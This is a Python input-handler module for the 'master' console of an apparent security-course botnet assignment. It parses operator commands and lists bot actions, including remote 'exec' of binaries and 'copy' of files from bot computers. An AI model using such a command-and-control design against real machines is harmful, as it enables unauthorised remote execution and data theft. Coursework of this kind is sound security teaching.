from typing import FrozenSet

from master.src.dataclasses.context import is_running, turn_off_master
from master.src.input.input_handler_definitions import InputStates, InputHandlerState, InputCommandTypes

__COMMANDS_WITHOUT_PARAM: FrozenSet[InputCommandTypes] = frozenset(
    [InputCommandTypes.W, InputCommandTypes.ID, InputCommandTypes.HELP, InputCommandTypes.EXIT])
__input_state = InputHandlerState()


def __print_hello_message() -> None:
    print("Welcome to master program of BSY winter assigment. Type 'help' for help. Type 'exit' for exit.")
    print("Here are commands executable on bots:")
    for command in InputCommandTypes:
        print(command.value)


def __print_help() -> None:
    print("Here is quick summary of what program does and which commands can you use and what they do:")
    print(
        "This is master program of BSY winter assigment. It servers as commander for bots distributed on other computers.")
    print(
        "To use this program in first step insert your command with parameter you wish, that they would run with separated with space.")
    print(
        "For instance write: ls .. to list parent directory. Then pick bot on which should command run by selecting his index number")
    print("Here is quick summary of what commands can you run on the bots:")
    print("- 'help' for help.")
    print("- 'w' for list users which are logged in on bot computer. Does not take parameter")
    print(
        "- 'ls' for list files and directories on specified path. If path is not specified, then lists current directory")
    print("- 'id' for retrieving id of current user on bot computer. Does not take parameter")
    print(
        "- 'copy' to copy file from remote computer to this computer. Files can be found in directory copied_files. Takes path to required file")
    print("- 'exec' to execute binary on remote computer. Takes param command which will be executed")
    print("- 'exit' to exit")


def __handle_exit() -> None:
    print("Exiting program please wait until program is exited successfully")
    turn_off_master()


def __check_if_command_is_one_of_valid_commands(command: str) -> InputCommandTypes:
    try:
        return InputCommandTypes(command)
    except ValueError:
        raise ValueError(f"Inserted command {command} is not valid. See help for valid commands")


def __check_if_command_is_valid_and_parse_it(command: str, param: str) -> InputCommandTypes:
    parsed_command = __check_if_command_is_one_of_valid_commands(command)
    if parsed_command in __COMMANDS_WITHOUT_PARAM and param != "":
        raise ValueError(f"Command {command} does not take param but received param {param}")
    if parsed_command not in __COMMANDS_WITHOUT_PARAM and param == "" and parsed_command != InputCommandTypes.LS:
        raise ValueError(f"Command {command} does take param but did not received any")
    return InputCommandTypes(command)


def __execute_master_program_commands(command: InputCommandTypes) -> bool:
    if command == InputCommandTypes.HELP:
        __print_help()
        return True
    elif command == InputCommandTypes.EXIT:
        __handle_exit()
        return True
    return False


def __parse_command_and_param(command: str) -> None:
    split_command = command.strip().split(" ", maxsplit=1)
    try:
        param = "" if len(split_command) == 1 else split_command[1]
        command = __check_if_command_is_valid_and_parse_it(split_command[0], param)
        if not __execute_master_program_commands(command):
            print("Further processing")
    except ValueError as e:
        print(e)


def __handle_user_command_input() -> None:
    inserted_command = input("Please insert your command: ")
    __parse_command_and_param(inserted_command)


def __handle_bot_select_input() -> None:
    pass


def handle_user_input() -> None:
    __print_hello_message()
    while is_running():
        if __input_state.state == InputStates.COMMAND_SELECT:
            __handle_user_command_input()
        elif __input_state.state == InputStates.BOT_SELECT:
            __handle_bot_select_input()
